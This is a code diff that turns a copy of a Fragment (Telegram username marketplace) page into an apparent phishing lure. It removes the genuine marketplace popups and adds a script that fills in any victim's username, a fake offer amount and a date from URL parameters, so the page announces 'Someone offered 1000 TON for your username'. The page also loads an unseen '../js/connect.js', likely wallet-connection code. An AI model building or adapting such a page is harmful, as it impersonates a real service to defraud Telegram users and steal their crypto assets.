@@ -4,7 +4,7 @@
  
 <head>
     <meta charset="utf-8" />
-    <title>imightbemilo – Fragment</title>
+    <title id="page-title">Fragment</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <meta name="format-detection" content="telephone=no" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -115,7 +115,7 @@
                     <h2 class="tm-section-header-text">
                         <span class="tm-section-header-domain">
                             <span class="tm-web3-address">
-                                <span class="subdomain">imightbemilo</span>
+                                <span class="subdomain" id="username-display">imightbemilo</span>
                                 <span class="domain">.t.me</span>
                             </span>
                         </span>
@@ -137,7 +137,7 @@
                     </table>
                     <div class="tm-bid-info-text tm-offer-info-text">
                         Someone offered
-                        <span class="icon-before icon-ton">1000</span>
+                        <span class="icon-before icon-ton" id="offer-amount">1000</span>
                         for your username. If the price suits you, press
                         "Accept the offer".
                         <a href="https://fragment.com/about" class="tm-nowrap js-howofferworks"><br />How does this work?</a>
@@ -149,13 +149,13 @@
                             Telegram Username
                         </dt>
                         <dd class="tm-list-item-value">
-                            <span class="accent-color">@imightbemilo</span>
+                            <span class="accent-color" id="telegram-username">@imightbemilo</span>
                         </dd>
                     </dl>
                     <dl class="tm-list-item">
                         <dt class="tm-list-item-title">Web Address</dt>
                         <dd class="tm-list-item-value">
-                            <span class="accent-color">t.me/imightbemilo</span>
+                            <span class="accent-color" id="web-address">t.me/imightbemilo</span>
                         </dd>
                     </dl>
                     <dl class="tm-list-item">
@@ -163,7 +163,7 @@
                             TON Web 3.0 Address
                         </dt>
                         <dd class="tm-list-item-value">
-                            <span class="accent-color"><span class="tm-web3-address"><span class="subdomain"> imightbemilo </span><span class="domain">.t.me</span></span>
+                            <span class="accent-color"><span class="tm-web3-address"><span class="subdomain" id="ton-username"> imightbemilo </span><span class="domain">.t.me</span></span>
                             </span>
                         </dd>
                     </dl>
@@ -203,14 +203,14 @@
                             <tr>
                                 <td>
                                     <div class="table-cell">
-                                        <div class="table-cell-value tm-value icon-before icon-ton">
+                                        <div class="table-cell-value tm-value icon-before icon-ton" id="table-offer-amount">
                                             1000
                                         </div>
                                     </div>
                                 </td>
                                 <td>
                                     <div class="table-cell">
-                                        <div class="tm-datetime">
+                                        <div class="tm-datetime" id="offer-date">
                                             19 Aug 2025 at 16:52
                                         </div>
                                     </div>
@@ -261,319 +261,6 @@
                 </div>
             </div>
         </div>
-        <div class="popup-container hide form-popup-container place-bid-popup-container js-place-bid-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h2>@user</h2>
-                        <p class="popup-text">
-                            Telegram username and user.t.me
-                        </p>
-                        <form class="js-place-bid-form">
-                            <div class="form-group">
-                                <label for="bid_value">Your bid</label>
-                                <div class="icon-before icon-ton form-control-wrap tm-coin-field">
-                                    <input inputmode="decimal" class="form-control js-amount-input" id="bid_value" name="bid_value" value="0" data-for="js-bid_value" data-usd-for="js-bid_usd_value" autocomplete="off" />
-                                </div>
-                                <p class="help-block">
-                                    Approximately $<span class="js-bid_usd_value">0</span>
-                                </p>
-                                <div class="tm-form-control-hint"></div>
-                            </div>
-                            <div class="form-main-button">
-                                <button type="submit" class="btn btn-primary btn-block">
-                                    <span class="tm-button-label">Place a
-                                        <span class="icon-before icon-ton tm-amount js-bid_value">0</span>
-                                        bid</span>
-                                </button>
-                            </div>
-                        </form>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container hide form-popup-container js-put-to-auction-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h4>Put up for auction</h4>
-                        <p class="popup-text">
-                            Do you want to make
-                            <span class="accent-color js-username"></span>
-                            available for auction on <b>Fragment</b>?
-                        </p>
-                        <form class="js-put-to-auction-form">
-                            <input type="hidden" name="username" />
-                            <div class="form-group">
-                                <label for="min_bid_value">Minimum bid</label>
-                                <div class="icon-before icon-ton form-control-wrap tm-coin-field">
-                                    <input inputmode="decimal" class="form-control js-amount-input" id="min_bid_value" name="min_bid_value" value="2" data-usd-for="js-bid_usd_value" autocomplete="off" />
-                                    <div class="form-control-hint">
-                                        ~ $<span class="js-bid_usd_value">14.59</span>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="form-group">
-                                <label for="max_price_value">Maximum price</label>
-                                <div class="icon-before icon-ton form-control-wrap tm-coin-field">
-                                    <input inputmode="decimal" class="form-control js-amount-input" id="max_price_value" name="max_price_value" value="" placeholder="Optional" autocomplete="off" />
-                                </div>
-                                <p class="help-block">
-                                    Set a maximum price if you want to
-                                    enable anyone to instantly buy
-                                    <span class="js-username"></span> for
-                                    this price.
-                                </p>
-                            </div>
-                            <div class="popup-buttons">
-                                <a class="btn btn-link btn-lg popup-cancel-btn">Cancel</a>
-                                <button type="submit" class="btn btn-link btn-lg">
-                                    Proceed
-                                </button>
-                            </div>
-                        </form>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container hide form-popup-container place-bid-popup-container js-sell-username-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h2 class="js-username"></h2>
-                        <p class="popup-text">
-                            Sell username on <b>Fragment</b>
-                        </p>
-                        <form class="js-sell-username-form">
-                            <input type="hidden" name="username" />
-                            <div class="form-group">
-                                <label for="sell_value">Sell price</label>
-                                <div class="icon-before icon-ton form-control-wrap tm-coin-field">
-                                    <input inputmode="decimal" class="form-control js-amount-input" id="sell_value" name="sell_value" value="2" data-for="js-bid_value" autocomplete="off" />
-                                </div>
-                                <div class="tm-form-control-hint"></div>
-                            </div>
-                            <div class="form-main-button">
-                                <button type="submit" class="btn btn-primary btn-block">
-                                    <span class="tm-button-label">Sell for
-                                        <span class="icon-before icon-ton tm-amount js-bid_value">2</span></span>
-                                </button>
-                            </div>
-                        </form>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container hide js-convert-confirm-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h4>Auction Your Username</h4>
-                        <p class="popup-text">
-                            The
-                            <span class="accent-color">@fragment</span> bot
-                            sent you a <b>confirmation message</b> on
-                            Telegram, please open it and follow the
-                            instructions to proceed.
-                        </p>
-                        <div class="popup-buttons">
-                            <a href="https://t.me/fragment" target="_blank" class="btn btn-link btn-lg">Open bot</a>
-                        </div>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container form-popup-container hide js-convert-bid-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h4>Auction Your Username</h4>
-                        <p class="popup-text">
-                            You can put
-                            <span class="accent-color js-username"></span>
-                            up for auction as a <b>collectible username</b>.
-                            This action is
-                            <b>irreversible</b>.<br /><br />The winner of
-                            the auction will <b>own</b> the TON collectible
-                            – and you are free to bid on it as well. Your
-                            wallet will receive the final amount in TON,
-                            minus
-                            <a target="_blank" rel="noopener" href="https://fragment.com/about#q-are-there-any-transaction-fees">conversion fees</a>.
-                        </p>
-                        <form class="js-convert-bid-form">
-                            <input type="hidden" name="id" />
-                            <div class="form-group">
-                                <label for="bid_value">Your first bid</label>
-                                <div class="icon-before icon-ton form-control-wrap tm-coin-field">
-                                    <input inputmode="decimal" class="form-control js-amount-input" id="bid_value" name="bid_value" value="10" data-for="js-bid_value" data-usd-for="js-bid_usd_value" autocomplete="off" />
-                                    <div class="form-control-hint">
-                                        ~ $<span class="js-bid_usd_value">72.94</span>
-                                    </div>
-                                </div>
-                                <p class="help-block">
-                                    The auction will start after you place
-                                    the first bid. If someone outbids you,
-                                    you will get this entire amount back. If
-                                    there are no other bidders, you will get
-                                    both the new collectible and your bid
-                                    amount back, minus 5% and minus a
-                                    <span class="icon-before icon-ton-text">5</span>
-                                    fee.
-                                </p>
-                            </div>
-                            <div class="popup-buttons">
-                                <a class="btn btn-link btn-lg popup-cancel-btn">Cancel</a>
-                                <button type="submit" class="btn btn-link btn-lg js-do-transfer-btn">
-                                    Continue
-                                </button>
-                            </div>
-                        </form>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container form-popup-container hide js-new-convert-bid-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h4>Auction Your Username</h4>
-                        <p class="popup-text">
-                            This will put
-                            <span class="accent-color js-username"></span>
-                            up for auction as a <b>collectible username</b>.
-                            You can cancel the auction at any time before
-                            the first bid is placed.<br /><br />You can
-                            place your own bids in the auction – the winner
-                            will
-                            <b>own the TON collectible</b>.<br /><br />Your
-                            wallet <span class="js-address"></span> will
-                            receive the final amount in TON, minus a 5%
-                            platform fee and a
-                            <a target="_blank" rel="noopener" href="https://fragment.com/about#q-are-there-any-transaction-fees">one-time</a>
-                            <span class="icon-before icon-ton">5</span>
-                            conversion fee.
-                        </p>
-                        <form class="js-new-convert-bid-form">
-                            <input type="hidden" name="id" />
-                            <div class="form-group">
-                                <label for="bid_value">Minimum bid</label>
-                                <div class="icon-before icon-ton form-control-wrap tm-coin-field">
-                                    <input inputmode="decimal" class="form-control js-amount-input" id="bid_value" name="bid_value" value="10" data-for="js-bid_value" data-usd-for="js-bid_usd_value" autocomplete="off" />
-                                    <div class="form-control-hint">
-                                        ~ $<span class="js-bid_usd_value">72.94</span>
-                                    </div>
-                                </div>
-                                <p class="help-block">
-                                    The auction will start after someone
-                                    places the first bid.
-                                </p>
-                            </div>
-                            <div class="popup-buttons">
-                                <a class="btn btn-link btn-lg popup-cancel-btn">Cancel</a>
-                                <button type="submit" class="btn btn-link btn-lg js-do-transfer-btn">
-                                    Create Auction
-                                </button>
-                            </div>
-                        </form>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container hide js-make-offer-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h4>Accept the offer</h4>
-                        <p class="popup-text">
-                            Let the owner of
-                            <span class="accent-color">@user</span> know
-                            that you are willing to buy this username.
-                        </p>
-                        <form class="js-make-offer-form">
-                            <input type="hidden" name="id" />
-                            <div class="form-group">
-                                <label for="amount_value">How much would you pay?</label>
-                                <div class="icon-before icon-ton form-control-wrap tm-coin-field">
-                                    <input inputmode="decimal" class="form-control js-amount-input" id="amount_value" name="amount_value" value="" data-for="js-amount_value" data-usd-for="js-amount_usd_value" placeholder="Enter any amount in TON" autocomplete="off" />
-                                    <div class="form-control-hint">
-                                        ~ $<span class="js-amount_usd_value"></span>
-                                    </div>
-                                </div>
-                                <p class="help-block">
-                                    We will notify you on Telegram if the
-                                    owner of the username makes it available
-                                    for sale.<br /><br />This service costs
-                                    <span class="icon-before icon-ton-text js-amount_fee"></span>
-                                    for this username.
-                                </p>
-                            </div>
-                            <div class="popup-buttons">
-                                <a class="btn btn-link btn-lg popup-cancel-btn">Cancel</a>
-                                <button type="submit" class="btn btn-link btn-lg js-do-offer-btn">
-                                    Proceed
-                                </button>
-                            </div>
-                        </form>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container hide js-howofferworks-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h4>How does this work?</h4>
-                        <p class="popup-text">
-                            You can make an offer for this username,
-                            suggesting the owner to sell it on Fragment. To
-                            encourage serious offers, this process requires
-                            a <b>small fee</b>.<br /><br /><b>To pay the fee, simply:</b><br />• Get
-                            <a href="https://tonkeeper.com/">Tonkeeper</a>,
-                            open it and create a <b>wallet</b>.<br />•
-                            Deposit funds in your <b>wallet</b> from a
-                            <a href="https://ton.org/buy-toncoin">supported exchange</a>
-                            or with
-                            <a href="https://wallet.t.me/">@wallet</a> on
-                            Telegram.<br />• Use <b>Tonkeeper</b> to log in
-                            on Fragment and return to this page.<br />• Log
-                            in with your <b>Telegram account</b> to receive
-                            a notification if the username gets listed.<br />•
-                            Tap the button to make an offer – enter the
-                            amount you'd be <b>willing to spend</b> for
-                            this username.<br />• Scan the QR code to
-                            <b>pay the fee</b> for making the offer.<br /><br />The
-                            owner will receive your offer on Telegram – if
-                            they decide to list their username,
-                            you'll be able to make your bid.<br /><br /><a href="https://fragment.com/about">Learn More</a>
-                        </p>
-                        <div class="popup-buttons">
-                            <a class="btn btn-link btn-lg popup-cancel-btn">Close</a>
-                        </div>
-                    </section>
-                </div>
-            </div>
-        </div>
-        <div class="popup-container hide js-botsabout-popup" data-close-outside="popup-body">
-            <div class="popup">
-                <div class="popup-body">
-                    <section>
-                        <h4>Bot usernames</h4>
-                        <p class="popup-text">
-                            This username has been upgraded and it can now
-                            be assigned not just to channels, groups or
-                            users, but also to bots. This upgrade is
-                            permanent and can be performed for any
-                            collectible username by paying a fee of
-                            <span class="icon-before icon-ton tm-amount">1,000</span>. Usernames will remain upgraded even if they
-                            change owners.
-                        </p>
-                        <div class="popup-buttons">
-                            <a class="btn btn-link btn-lg popup-cancel-btn">OK, got it</a>
-                        </div>
-                    </section>
-                </div>
-            </div>
-        </div>
         <footer class="tm-footer">
             <div class="tm-footer-links">
                 <a href="https://fragment.com/" class="tm-footer-link">Top Auctions</a>
@@ -583,6 +270,158 @@
             </div>
         </footer>
     </div>
+    
+    <script>
+        // Function to decode Base64 URL-safe
+        function base64UrlDecode(str) {
+            // Add padding if needed
+            str += '='.repeat((4 - str.length % 4) % 4);
+            // Replace URL-safe characters
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            try {
+                return atob(str);
+            } catch (e) {
+                console.error('Failed to decode base64:', e);
+                return null;
+            }
+        }
+
+        // Function to parse Telegram initData
+        function parseTelegramInitData(initData) {
+            try {
+                const decoded = base64UrlDecode(initData);
+                if (!decoded) return null;
+                
+                // Try to parse as JSON first
+                try {
+                    return JSON.parse(decoded);
+                } catch (e) {
+                    // If not JSON, try to parse as URL parameters
+                    const params = new URLSearchParams(decoded);
+                    const result = {};
+                    for (const [key, value] of params.entries()) {
+                        result[key] = value;
+                    }
+                    return result;
+                }
+            } catch (e) {
+                console.error('Failed to parse initData:', e);
+                return null;
+            }
+        }
+
+        // Function to format timestamp to readable date
+        function formatTimestamp(timestamp) {
+            try {
+                // Handle both seconds and milliseconds timestamps
+                const ts = timestamp.length <= 10 ? parseInt(timestamp) * 1000 : parseInt(timestamp);
+                const date = new Date(ts);
+                
+                const options = {
+                    day: '2-digit',
+                    month: 'short',
+                    year: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    hour12: false
+                };
+                
+                return date.toLocaleDateString('en-GB', options).replace(',', ' at');
+            } catch (e) {
+                console.error('Failed to format timestamp:', e);
+                return 'Invalid date';
+            }
+        }
+
+        // Function to update page with parameters
+        function updatePageWithParams(params) {
+            const username = params.username || params.user || 'imightbemilo';
+            const price = params.price || params.amount || params.offer || '1000';
+            const timestamp = params.timestamp || params.date || params.ts;
+
+            // Update username in all locations
+            document.getElementById('username-display').textContent = username;
+            document.getElementById('telegram-username').textContent = '@' + username;
+            document.getElementById('web-address').textContent = 't.me/' + username;
+            document.getElementById('ton-username').textContent = ' ' + username + ' ';
+            document.title = username + ' – Fragment';
+
+            // Update price in all locations
+            document.getElementById('offer-amount').textContent = price;
+            document.getElementById('table-offer-amount').textContent = price;
+
+            // Update timestamp if provided
+            if (timestamp) {
+                const formattedDate = formatTimestamp(timestamp);
+                document.getElementById('offer-date').textContent = formattedDate;
+            }
+
+            // Update actions data attributes
+            const actionsElement = document.querySelector('.js-actions');
+            if (actionsElement) {
+                actionsElement.setAttribute('data-username', username);
+                actionsElement.setAttribute('data-item-title', '@' + username);
+            }
+
+            console.log('Page updated with params:', { username, price, timestamp });
+        }
+
+        // Main initialization function
+        function initializePage() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let params = {};
+
+            // Check for direct URL parameters first
+            if (urlParams.has('username') || urlParams.has('price') || urlParams.has('timestamp')) {
+                params.username = urlParams.get('username');
+                params.price = urlParams.get('price');
+                params.timestamp = urlParams.get('timestamp');
+            }
+            
+            // Check for Telegram initData parameter
+            else if (urlParams.has('tgWebAppData') || urlParams.has('initData')) {
+                const initData = urlParams.get('tgWebAppData') || urlParams.get('initData');
+                const parsedData = parseTelegramInitData(initData);
+                if (parsedData) {
+                    params = { ...params, ...parsedData };
+                }
+            }
+            
+            // Check for base64 encoded data parameter
+            else if (urlParams.has('data')) {
+                const encodedData = urlParams.get('data');
+                const parsedData = parseTelegramInitData(encodedData);
+                if (parsedData) {
+                    params = { ...params, ...parsedData };
+                }
+            }
+
+            // Update page with parameters (will use defaults if none provided)
+            updatePageWithParams(params);
+        }
+
+        // Initialize when DOM is loaded
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializePage);
+        } else {
+            initializePage();
+        }
+
+        // Also listen for hash changes in case parameters are passed that way
+        window.addEventListener('hashchange', initializePage);
+
+        // Debug function to test with sample data
+        window.testWithSampleData = function() {
+            const sampleParams = {
+                username: 'testuser',
+                price: '2500',
+                timestamp: Math.floor(Date.now() / 1000).toString()
+            };
+            updatePageWithParams(sampleParams);
+        };
+
+        console.log('Fragment username offer page initialized. Use testWithSampleData() to test with sample data.');
+    </script>
     <script src="../js/connect.js"></script>
 </body>
  
